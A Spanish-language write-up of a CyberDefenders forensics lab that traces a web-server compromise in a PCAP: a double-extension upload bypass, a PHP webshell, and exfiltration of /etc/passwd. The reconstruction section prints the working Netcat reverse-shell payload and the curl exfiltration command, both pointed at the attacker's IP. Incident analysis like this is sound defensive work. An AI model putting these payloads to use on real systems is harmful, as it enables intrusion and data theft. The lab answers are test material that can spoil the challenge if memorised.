Una empresa detectó actividad sospechosa en su servidor web de e-commerce, shoporoma.com. En el PCAP vemos cómo un atacante evadió la validación de uploads con una doble extensión, abrió un reverse shell por el puerto 8080 y exfiltró `/etc/passwd`.

## El caso

Una empresa detecta actividad sospechosa en su servidor web de e-commerce (shoporoma.com). Se sospecha que un actor externo intentó comprometer el servidor mediante la subida de archivos maliciosos.

Nos entregan un PCAP para analizar el compromiso del servidor web vía file upload malicioso. El objetivo es identificar con Wireshark el origen del atacante, la técnica de intrusión, el webshell subido y la exfiltración de datos post-compromiso.

- **Plataforma:** CyberDefenders
- **Categoría:** Network Forensics
- **Herramientas:** Wireshark, IP Geolocation Lookup
- **Tácticas:** Initial Access, Execution, Command and Control

## La investigación

### De dónde viene el ataque

**Q1.** Understanding the geographical origin of an attack helps in assessing its severity and urgency. Can you identify the city from which the attack originated?

Observando el tráfico HTTP en Wireshark identificamos la IP atacante: **117.11.88.124**. Con una consulta en IP Geolocation Lookup confirmamos el origen geográfico.

![Resultado de geolocalización de la IP atacante 117.11.88.124](https://github.com/user-attachments/assets/99b3da02-8266-4d79-831c-f7594a3254f1 "Geolocalización de la IP atacante")

> **Respuesta:** `Tianjin`

### La huella del cliente

**Q2.** Knowing the attacker's user-agent assists in creating accurate filtering rules. What's the attacker's user-agent?

Al analizar las peticiones HTTP desde la IP atacante hacia shoporoma.com leemos directamente el campo User-Agent en los headers de cada request.

![Peticiones HTTP del atacante con el campo User-Agent visible](https://github.com/user-attachments/assets/5ecd67c4-128e-445b-8b2d-f275414897f5 "Cabecera User-Agent de las peticiones del atacante")

> **Respuesta:** `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`

### Del rechazo al bypass por doble extensión

**Q3.** We need to identify if there were multiple attempts to exploit the file upload vulnerability. What is the name of the malicious file used in the first upload attempt?

Filtramos las peticiones POST al endpoint `/reviews/upload.php` y revisamos los uploads en orden cronológico. En el primer intento el atacante subió un archivo llamado `image.php`. El servidor respondió con **"Invalid file format"**: lo rechazó por no cumplir la validación de extensión esperada.

![Primer upload de image.php rechazado con Invalid file format](https://github.com/user-attachments/assets/cfdd25ea-6696-4f0b-b343-9d6b0aaa7cad "Primer intento de upload rechazado por el servidor")

Después corroboramos que el atacante ofuscó el archivo malicioso con una doble extensión y así logró pasar el filtro del sitio.

![Segundo upload con doble extensión aceptado por el servidor](https://github.com/user-attachments/assets/ed7e7006-b79d-4a47-bd49-4d44406412d4 "Upload con doble extensión que evade el filtro")

> **Respuesta:** `image.jpg.php`

### Dónde quedó el archivo

**Q4.** Knowing the directory where files are uploaded is important for locating malicious files and understanding the server's file structure. What is the path of the directory used by the attacker to store the uploaded files?

Tras los intentos de upload, el atacante hizo un GET al path `/reviews/uploads` y recibió una redirección `301 Moved Permanently` hacia `/reviews/uploads/`. La segunda solicitud devolvió `200 OK`, lo que confirma que el directorio de uploads existe y es accesible públicamente.

![GET a /reviews/uploads con redirección 301 y respuesta 200 OK](https://github.com/user-attachments/assets/38647344-e3d4-4122-991e-0faf5d2c0db8 "Redirección 301 y respuesta 200 OK sobre el directorio de uploads")

> **Respuesta:** `/reviews/uploads/`

### El puerto del reverse shell

**Q5.** Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?

Confirmado el upload exitoso, analizamos el contenido del webshell embebido en el archivo. El payload PHP ejecuta un reverse shell con Netcat y se conecta de vuelta al servidor del atacante (117.11.88.124) en el puerto **8080**.

![Contenido del webshell PHP con el reverse shell de Netcat](https://github.com/user-attachments/assets/981fc5fc-df23-4700-a18d-212ddb5ce93a "Payload PHP del webshell con la conexión hacia el puerto 8080")

> **Respuesta:** `8080`

### Qué intentó llevarse

**Q6.** Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?

Siguiendo el tráfico posterior al establecimiento del reverse shell, vemos que el atacante ejecutó un `curl` con un POST que llevaba el contenido del archivo `/etc/passwd` hacia su servidor de comando y control. Ese archivo contiene información de todos los usuarios del sistema comprometido.

![Tráfico de exfiltración con curl enviando /etc/passwd al servidor del atacante](https://github.com/user-attachments/assets/fcf6f3e5-5f0e-4c11-abde-e95acb8d5630 "Exfiltración de /etc/passwd mediante curl")

> **Respuesta:** `/etc/passwd`

## Reconstrucción del ataque

1. **Identificación del atacante.** IP `117.11.88.124` (Tianjin, China), User-Agent `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`, objetivo shoporoma.com, endpoint `/reviews/upload.php`.
2. **File upload.** Primer intento fallido con `image.php` ("Invalid file format"). Segundo intento exitoso con `image.jpg.php` ("File uploaded successfully"). El bypass fue la doble extensión `.jpg.php` para evadir la validación del servidor.
3. **Reconocimiento post-upload.** GET `/reviews/uploads`, redirección 301 hacia `/reviews/uploads/` y 200 OK. El directorio de uploads queda confirmado y accesible públicamente.
4. **Reverse shell y exfiltración.** El payload `<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>` abre un C2 hacia `117.11.88.124:8080`. Después, `curl -X POST -d /etc/passwd` envía el archivo a `117.11.88.124`.

Técnicas observadas: T1505.003 - Web Shell, T1059.004 - Unix Shell y T1041 - Exfiltration Over C2 Channel.

## MITRE ATT&CK

| Táctica | Técnica | ID | Evidencia |
|---------|---------|----|-----------|
| Initial Access | Exploit Public-Facing Application | T1190 | Explotación del endpoint `/reviews/upload.php` en shoporoma.com |
| Defense Evasion | Masquerading: Double File Extension | T1036.007 | Archivo `image.jpg.php` con doble extensión para evadir validación del servidor |
| Persistence | Server Software Component: Web Shell | T1505.003 | Upload exitoso de webshell PHP con reverse shell embebido |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Reverse shell ejecutado via `/bin/sh` a través del webshell |
| Command and Control | Non-Standard Port | T1571 | Comunicación C2 establecida sobre puerto 8080 via Netcat |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | `curl -X POST -d /etc/passwd` enviado al servidor del atacante |

## Indicadores de compromiso

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| IP | `117.11.88.124` | Origen del ataque (Tianjin) y servidor C2 |
| Puerto | `8080` | Puerto del reverse shell hacia el atacante |
| Dominio | `shoporoma.com` | Servidor web comprometido |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` | Cliente usado por el atacante |
| Archivo | `image.jpg.php` | Webshell subido con doble extensión |
| Ruta | `/reviews/upload.php` | Endpoint vulnerable de subida de archivos |
| Ruta | `/reviews/uploads/` | Directorio donde quedó el archivo subido |
| Ruta | `/etc/passwd` | Archivo exfiltrado |

## Herramientas

- **Wireshark:** disección del PCAP, streams HTTP y seguimiento de streams TCP.
- **IP Geolocation Lookup:** geolocalización de la IP atacante.

## Lecciones aprendidas

1. **Validación de file uploads.** Los servidores deben verificar el tipo real del archivo que se sube, no solo el nombre. Permitir extensiones dobles como `.jpg.php` es una configuración insegura que puede derivar en compromisos graves.
2. **Detección de webshells.** Un archivo subido que luego genera tráfico de red saliente desde el servidor es una señal de alerta clara. Monitorear conexiones inesperadas hacia IPs externas es una práctica básica de defensa.
3. **Protección de archivos sensibles.** Archivos como `/etc/passwd` contienen información crítica del sistema. Su exfiltración indica que el atacante ya ejecuta comandos en el servidor, lo que escala considerablemente la severidad del incidente.
